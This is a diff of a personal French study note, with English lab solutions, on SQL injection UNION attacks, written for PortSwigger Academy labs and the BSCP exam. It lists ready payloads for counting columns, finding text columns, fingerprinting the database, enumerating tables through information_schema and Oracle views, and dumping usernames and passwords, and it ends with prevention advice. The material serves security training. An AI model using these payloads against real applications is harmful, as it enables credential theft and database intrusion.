@@ -9,17 +9,21 @@ statut: à faire
 # SQL-injection-Union-Attacks
 
 ## En bref
-- Elle s'applique quand l'application est vulnérable à l'injection SQL et que les résultats de la requête sont renvoyés dans ses réponses.
+- L'attaque s'applique quand l'application est vulnérable à l'injection SQL et que les résultats de la requête sont renvoyés dans ses réponses.
 - Le mot clé `UNION` permet d'extraire des données d'autres tables de la base.
 - Il permet d’exécuter une ou plusieurs requêtes `SELECT` supplémentaires et d’ajouter leurs résultats à ceux de la requête d’origine.
 - Exemple: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`.
 - Cette requête renvoie un seul jeu de résultats à deux colonnes, contenant les valeurs de `a` et `b` (table1) et celles de `c` et `d` (table2).
 
 ## Types et variantes
-- 
+- `UNION` supprime les doublons du jeu de résultats, `UNION ALL` les conserve. Les deux fonctionnent pour l'attaque, avec les mêmes contraintes (même nombre de colonnes, types compatibles).
+- Le point d'injection peut être une chaîne entre guillemets (il faut alors fermer le guillemet avec `'`) ou une valeur numérique (pas de guillemet à fermer). Les charges utiles de cette note supposent une chaîne entre guillemets dans la clause `WHERE`.
+- La syntaxe varie selon la base de données (voir plus bas) : Oracle, MySQL, Microsoft SQL Server, PostgreSQL.
 
 ## Comment détecter
-- 
+- Envoyer un guillemet simple `'` dans le paramètre : une erreur de base de données ou une réponse anormale indique un point d'injection potentiel.
+- Confirmer avec une charge utile qui modifie la logique de la requête, par exemple `' OR 1=1--`, puis passer à la détermination du nombre de colonnes.
+- Condition indispensable pour l'attaque UNION : le résultat de la requête doit être affiché dans la réponse. Si ce n'est pas le cas, il faut une autre technique (injection SQL aveugle).
 
 ## Comment exploiter (principe)
 - Pour qu'elle puisse fonctionner, deux conditions essentielles doivent être remplies:
@@ -29,22 +33,23 @@ statut: à faire
 	- Le nombre de colonnes renvoyées par la requête d'origine.
 	- Quelles colonnes renvoyées par la requête d'origine ont un type de données adapté pour contenir les résultats de la requête injectée.
 ### Détermination du nombre de colonnes requises (Méthode order by)
-- Lors d’une injection SQL UNION, il existe deux méthodes efficaces pour trouver le nombre de colonnes de la requête d’origine. Ce texte détaille la première.
+- Lors d’une injection SQL UNION, il existe deux méthodes efficaces pour trouver le nombre de colonnes de la requête d’origine. Voici la première.
 - Principe : injecter une série de clauses `ORDER BY` en incrémentant l’index de colonne jusqu’à ce qu’une erreur se produise.
+
 **Charges utiles**
-- Si le point d'injection est une chaîne entre guillemets dans la clause `WHERE` on envoie donc:
+- Si le point d'injection est une chaîne entre guillemets dans la clause `WHERE`, on envoie donc:
 	- `' ORDER BY 1--`
 	- `' ORDER BY 2--`
-	- ' `ORDER BY 3--`
+	- `' ORDER BY 3--`
 	- et ainsi de suite
 - Chaque charge utile trie les résultats selon une colonne différente du jeu de résultats.
 - La colonne peut être désignée par son index : il n’est pas nécessaire de connaître les noms des colonnes.
-- Quand l’index dépasse le nombre réel de colonnes, la base renvoie une erreur (exemple : la position n° 3 de la clause `ORDER BY` est hors de la plage de la liste de sélection.
+- Quand l’index dépasse le nombre réel de colonnes, la base renvoie une erreur (exemple : la position n° 3 de la clause `ORDER BY` est hors de la plage de la liste de sélection).
 ### Lecture de la réponse
-- L'application peut renvouer l'erreur de la base dans la réponse HTTP, une erreur générique, ou simplement aucun résultat.
+- L'application peut renvoyer l'erreur de la base dans la réponse HTTP, une erreur générique, ou simplement aucun résultat.
 - Tant qu’une différence dans la réponse est détectable, on peut en déduire le nombre de colonnes (la dernière valeur d’index qui n’a pas provoqué d’erreur).
 ### Détermination du nombre de colonnes requises (Méthode union select null)
-- Seconde méthode: envoyer une série de charges utiles `UNION SELECT` avec un nombre croissant de valeur `NULL`
+- Seconde méthode: envoyer une série de charges utiles `UNION SELECT` avec un nombre croissant de valeurs `NULL`.
 - Charges utiles:
 	- `' UNION SELECT NULL--`
 	- `' UNION SELECT NULL,NULL--`
@@ -73,7 +78,7 @@ statut: à faire
 - Alternative : le caractère `#` permet aussi d’indiquer un commentaire.
 
 **Astuce pratique**
-- Dans une URL, l’espace après `--` s’écrit `+` ou `%20`, et `#` doit être encodé en `%23` (information de ma connaissance générale, non issue de votre texte).
+- Dans une URL, l’espace après `--` s’écrit `+` ou `%20`, et `#` doit être encodé en `%23`, sinon il est interprété comme le début du fragment de l'URL et n'est jamais envoyé au serveur.
 ## Trouver les colonnes avec un type de données utile
 - Une attaque UNION permet de récupérer les résultats d’une requête injectée.
 - Les données intéressantes sont normalement sous forme de chaîne : il faut donc trouver une ou plusieurs colonnes dont le type est, ou est compatible avec, des données de type chaîne.
@@ -86,23 +91,27 @@ statut: à faire
 	- `' UNION SELECT NULL,'a',NULL,NULL--`
 	- `' UNION SELECT NULL,NULL,'a',NULL--`
 	- `' UNION SELECT NULL,NULL,NULL,'a'--`
+
 **Lecture du résultat**
 - Colonne incompatible avec une chaîne : la requête injectée provoque une erreur de base de données (exemple : échec de conversion de la valeur varchar ‘a’ vers le type de données int).
 - Aucune erreur et réponse contenant du contenu supplémentaire avec la chaîne injectée : la colonne convient pour récupérer des données de type chaîne.
-## Récupérer des données intéressantes avec une injection SQL UNION**
+- Dans un lab, le sujet fournit une valeur aléatoire à faire apparaître dans la réponse : on la place à la place de `'a'`.
+## Récupérer des données intéressantes avec une injection SQL UNION
 - Une fois le nombre de colonnes déterminé et les colonnes de type chaîne identifiées, on peut récupérer des données intéressantes.
 - Exemples:
 	- La requête d’origine renvoie deux colonnes, toutes deux compatibles avec des chaînes.
 	- Le point d’injection est une chaîne entre guillemets dans la clause `WHERE`.
 	- La base contient une table `users` avec les colonnes `username` et `password`.
+
 **Charge utile**
 - Le contenu de la table `users` s’obtient avec : `' UNION SELECT username, password FROM users--`
+
 **Prérequis**
 - Il faut connaître le nom de la table (`users`) et de ses colonnes (`username`, `password`).
 - Sans cette information, il faut deviner les noms des tables et des colonnes.
-- Toutes les bases modernes offrent des moyens d’examiner leur structure et de savoir quelles tables et colonnes elles contiennent
+- Toutes les bases modernes offrent des moyens d’examiner leur structure et de savoir quelles tables et colonnes elles contiennent (voir « Afficher le contenu de la base de données »).
 ## Récupérer plusieurs valeurs dans une seule colonne
-- Dans certains cas, la requête d’origine ne renvoie qu’une seule colonne.
+- Dans certains cas, la requête d’origine ne renvoie qu’une seule colonne de type chaîne (ou une seule parmi plusieurs).
 - On peut alors récupérer plusieurs valeurs ensemble dans cette colonne en les concaténant.
 - On peut inclure un séparateur pour distinguer les valeurs combinées.
 
@@ -117,23 +126,35 @@ statut: à faire
     - `wiener~peter`
     - `carlos~montoya`
 
- **Point clé**
+**Point clé**
 - Chaque base de données utilise une syntaxe différente pour la concaténation.
 - Pour les détails, consulter le cheat sheet de l’injection SQL de PortSwigger.
+
+**Concaténation selon la base** (d'après le cheat sheet de PortSwigger)
+
+| Type de base de données | Syntaxe                                     |
+| ----------------------- | ------------------------------------------- |
+| Oracle                  | `'foo'\|\|'bar'`                            |
+| PostgreSQL              | `'foo'\|\|'bar'`                            |
+| Microsoft               | `'foo'+'bar'`                               |
+| MySQL                   | `'foo' 'bar'` (espace) ou `CONCAT('foo','bar')` |
+
+- Piège : dans une URL, `+` est lu comme un espace. Pour concaténer sur Microsoft, il faut envoyer `%2b`.
+- Si la requête d'origine a deux colonnes dont une seule accepte du texte, on place `NULL` dans l'autre : `' UNION SELECT NULL,username||'~'||password FROM users--`.
 ## Analyse de la base de données
 - Il est souvent nécessaire de recueillir des informations sur la base de données. Cela peut comprendre:
 	- Le type et la version de la base de données.
-	- Les tables et le contenues dans les base de données.
+	- Les tables que contient la base et les colonnes de ces tables.
 ### Interroger le type et la version de la base de données
-- On peut identifier le type et la version de la base en injectant des requetes propres à chaque fournisseur, puis en vérifiant laquelle fonctionne.
+- On peut identifier le type et la version de la base en injectant des requêtes propres à chaque fournisseur, puis en vérifiant laquelle fonctionne.
 
 **Requêtes selon la base**
 
-| Type de base de données | Requête                  |
-| ----------------------- | ------------------------ |
-| Microsoft, MySQL        | `SELECT @@version`       |
-| Oracle                  | `SELECT * FROM v$version` |
-| PostgreSQL              | `SELECT version()`       |
+| Type de base de données | Requête                                                       |
+| ----------------------- | ------------------------------------------------------------- |
+| Microsoft, MySQL        | `SELECT @@version`                                            |
+| Oracle                  | `SELECT * FROM v$version` (ou `SELECT banner FROM v$version`) |
+| PostgreSQL              | `SELECT version()`                                            |
 
 **Exemple**
 - Charge utile UNION : `' UNION SELECT @@version--`
@@ -142,32 +163,49 @@ statut: à faire
 
 **Rappel pratique**
 - Cette requête doit respecter les contraintes vues plus haut : bon nombre de colonnes et colonne compatible avec une chaîne (par exemple `' UNION SELECT @@version,NULL--` si la requête d’origine a deux colonnes).
-- Sur Oracle, il faut ajouter `FROM DUAL` quand la requête ne cible pas de table, mais `SELECT * FROM v$version` cible déjà une table. On cherchera plutôt à récupérer la colonne `banner` : `' UNION SELECT banner,NULL FROM v$version--`
+- Sur MySQL, terminer par `#` ou par `-- ` (avec l'espace), par exemple `' UNION SELECT @@version,NULL#`.
+- Sur Oracle, il faut ajouter `FROM DUAL` quand la requête ne cible pas de table, mais `v$version` est déjà une table. On cible la colonne `banner` : `' UNION SELECT banner,NULL FROM v$version--`
 ## Afficher le contenu de la base de données
-- La plupart des types de bases de données, sauf Oracle, disposent d’un ensemble de vues appelé schéma d’information, qui fournit des informations sur la base.
+- La plupart des types de bases de données, sauf Oracle, disposent d’un ensemble de vues appelé schéma d’information (`information_schema`), qui fournit des informations sur la base.
+- Oracle utilise à la place les vues `all_tables` et `all_tab_columns`.
 ### Lister les tables
 - Requête : `SELECT * FROM information_schema.tables`
 - Colonnes renvoyées : `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `TABLE_TYPE`.
-- Dans l’exemple, la sortie révèle trois tables : `Products`, `Users` et `Feedback`.
+- Dans l’exemple de PortSwigger, la sortie révèle trois tables : `Products`, `Users` et `Feedback`.
+- Oracle : `SELECT * FROM all_tables` (colonnes utiles : `OWNER`, `TABLE_NAME`).
 ### Lister les colonnes d'une table
 - Requête : `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
 - Colonnes renvoyées : `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`.
 - Dans l’exemple, la table `Users` contient `UserId` (int), `Username` (varchar) et `Password` (varchar).
+- Oracle : `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` (colonnes utiles : `OWNER`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`). Oracle stocke les noms non protégés par des guillemets en majuscules : il faut écrire `'USERS'`.
 ### Lien avec l'attaque UNION
 - Cela répond au prérequis vu plus haut : connaître les noms de tables et de colonnes avant de lancer `' UNION SELECT username, password FROM users--`.
-- En pratique, via une injection UNION, on cible les colonnes utiles plutôt que `*` pour respecter le nombre de colonnes, par exemple `' UNION SELECT table_name,NULL FROM information_schema.tables--` (information de ma connaissance générale, non issue de votre texte).
+- En pratique, via une injection UNION, on cible les colonnes utiles plutôt que `*` pour respecter le nombre de colonnes. Déroulé :
+	- Tables, base non Oracle : `' UNION SELECT table_name,NULL FROM information_schema.tables--`
+	- Colonnes, base non Oracle : `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`
+	- Tables, Oracle : `' UNION SELECT table_name,NULL FROM all_tables--`
+	- Colonnes, Oracle : `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--`
+	- Données : `' UNION SELECT username, password FROM users--`
+- Dans les labs, les noms de table et de colonnes sont aléatoires (par exemple `users_abcdef`) : il faut obligatoirement passer par cette énumération.
 
-
-**Référence**: 
 ## Pièges et points d'attention BSCP
-- 
+- Déterminer le nombre de colonnes avant tout, puis les colonnes de type chaîne : sauter ces étapes fait échouer l'injection sans message clair.
+- Oracle : `FROM dual` obligatoire pour les `SELECT` sans table, noms d'objets en majuscules dans `all_tables` et `all_tab_columns`.
+- MySQL : `-- ` exige l'espace final (en URL `--+`), ou utiliser `#` encodé en `%23`.
+- Encodage URL : `+` vaut espace, donc `%2b` pour l'opérateur de concaténation Microsoft.
+- Une seule colonne de type chaîne : concaténer plusieurs valeurs avec un séparateur.
+- La réponse peut ne pas afficher d'erreur : comparer longueur et contenu des réponses (Burp Repeater) plutôt que chercher un message.
+- La requête d'origine peut renvoyer plusieurs lignes : la ligne injectée apparaît en plus, parfois en bas de la liste. Utiliser une catégorie inexistante dans le filtre peut isoler le résultat injecté.
+- Le point d'injection n'est pas toujours dans l'URL (corps de la requête, cookie, en-tête) : la méthode reste la même.
 
 ## Prévention
-- 
+- Utiliser des requêtes paramétrées (requêtes préparées) pour toute donnée fournie par l'utilisateur, jamais de concaténation de chaînes dans la requête.
+- Appliquer le principe du moindre privilège au compte de la base : pas d'accès à des tables inutiles ni aux vues de schéma sensibles.
+- Ne pas renvoyer les erreurs détaillées de la base à l'utilisateur.
 
 ## Labs PortSwigger
 - [x] Apprentice ✅ 2026-10-26
-- [ ] Practitioner
+- [x] Practitioner ✅ 2026-10-27
 - [ ] Expert
 
 ## Journal des labs
@@ -193,13 +231,22 @@ Le laboratoire vous fournira une valeur aléatoire que vous devrez faire appara�
 3. Try replacing each null with the random value provided by the lab, for example:
     
     `'+UNION+SELECT+NULL,'abcdef',NULL--`
-1. If an error occurs, move on to the next null and try that instead.
-## Lab: SQL injection UNION attack, retrieving data from other tables
+4. If an error occurs, move on to the next null and try that instead.
+### Lab: SQL injection UNION attack, retrieving data from other tables
 Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque UNION pour extraire des données d'autres tables. Pour mettre en place une telle attaque, vous devez combiner certaines des techniques apprises lors des laboratoires précédents.
 
 La base de données contient une autre table nommée « users », comportant des colonnes intitulées « username » et « password ».
 
 Pour résoudre cet exercice, lancez une attaque par injection SQL de type UNION permettant de récupérer tous les noms d'utilisateur et mots de passe, puis utilisez ces informations pour vous connecter en tant qu'administrateur.
+#### Solution
+1. Use Burp Suite to intercept and modify the request that sets the product category filter.
+2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
+    
+    `'+UNION+SELECT+'abc','def'--`
+3. Use the following payload to retrieve the contents of the `users` table:
+    
+    `'+UNION+SELECT+username,+password+FROM+users--`
+4. Verify that the application's response contains usernames and passwords.
 ### Lab: SQL injection UNION attack, retrieving multiple values in a single column
 Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables.
 
@@ -208,18 +255,18 @@ La base de données contient une autre table nommée « users », comportant des
 Pour réussir ce laboratoire, effectuez une attaque de type injection SQL UNION permettant d'extraire tous les noms d'utilisateur et mots de passe, puis utilisez ces informations pour vous connecter en tant qu'administrateur.
 #### Solution
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
+2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contains text, using a payload like the following in the `category` parameter:
     
-    `'+UNION+SELECT+'abc','def'--`
-3. Use the following payload to retrieve the contents of the `users` table:
+    `'+UNION+SELECT+NULL,'abc'--`
+3. Use the following payload to retrieve the contents of the `users` table, concatenating username and password in the text column:
     
-    `'+UNION+SELECT+username,+password+FROM+users--`
+    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
 4. Verify that the application's response contains usernames and passwords.
 
 ### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 To solve the lab, display the database version string.
-#### **Solution**
+#### Solution
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
     
@@ -228,14 +275,13 @@ To solve the lab, display the database version string.
     
     `'+UNION+SELECT+@@version,+NULL#`
 
-## Lab: SQL injection attack, listing the database contents on non-Oracle databases
+### Lab: SQL injection attack, listing the database contents on non-Oracle databases
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
 
 The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
 
 To solve the lab, log in as the `administrator` user.
 #### Solution
-
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
     
